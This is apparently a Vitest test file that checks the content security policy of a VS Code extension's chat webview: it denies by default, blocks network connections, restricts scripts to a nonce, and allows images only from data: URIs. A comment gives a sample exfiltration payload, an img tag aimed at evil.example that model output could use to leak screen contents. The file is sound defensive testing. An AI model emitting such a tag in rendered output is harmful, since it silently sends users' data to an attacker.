import { readFileSync } from 'node:fs'
import path from 'node:path'
import { describe, expect, it } from 'vitest'

// `__dirname`, not `import.meta`: this package builds to CommonJS.
const source = readFileSync(path.join(__dirname, 'chatViewProvider.ts'), 'utf8').replace(
  /\r\n/g,
  '\n',
)

/** The policy as written, one directive per entry. */
const directives = ((): string[] => {
  const start = source.indexOf('const csp = [')
  const end = source.indexOf("].join('; ')", start)
  expect(start).toBeGreaterThan(-1)
  /*
   * Double quotes first: a directive is written `"default-src 'none'"`, so a pattern that only
   * knows single quotes captures the `'none'` inside it and loses the directive entirely.
   */
  return [...source.slice(start, end).matchAll(/"([^"]+)"|`([^`]+)`|'([^']*-src[^']*)'/g)]
    .map((match) => match[1] ?? match[2] ?? match[3] ?? '')
    .filter((entry) => entry.includes('-src'))
})()

/**
 * What the webview is allowed to load.
 *
 * The chat renders model output, so the policy is the line between "the model said something
 * misleading" and "the model made the panel do something". Nothing here had a test, which is how
 * `img-src` came to be the one directive nobody could change safely.
 */
describe('the webview content security policy', () => {
  it('denies everything by default', () => {
    expect(directives).toContain("default-src 'none'")
  })

  /* The panel talks to the extension host over the webview bridge, never over the network. */
  it('permits no network connection at all', () => {
    expect(directives).toContain("connect-src 'none'")
  })

  it('runs only the bundled script, by nonce', () => {
    expect(directives.some((entry) => entry.startsWith('script-src') && entry.includes('nonce-'))).toBe(
      true,
    )
  })

  /*
   * The property that matters, stated as a prohibition rather than a value.
   *
   * `img-src` exists so a generated diagram can render as a `data:` URI. What it must never gain
   * is a *remote* scheme: model output containing `<img src="https://evil.example/?d=…">` would
   * send whatever is on screen to whoever wrote it, purely as a side effect of rendering. A
   * `data:` URI makes no request, so it cannot.
   */
  it('allows images only from data:, never from anywhere that could be fetched', () => {
    const images = directives.find((entry) => entry.startsWith('img-src'))
    expect(images).toBeDefined()
    expect(images).toContain('data:')
    for (const forbidden of ['http:', 'https:', '*', "'self'", 'blob:']) {
      expect(images, `img-src must not allow ${forbidden}`).not.toContain(forbidden)
    }
  })

  /* Invariant 4: no remote asset, ever. A directive naming a host would be one. */
  it('names no host anywhere in the policy', () => {
    for (const entry of directives) {
      expect(entry).not.toMatch(/https?:\/\//)
    }
  })
})
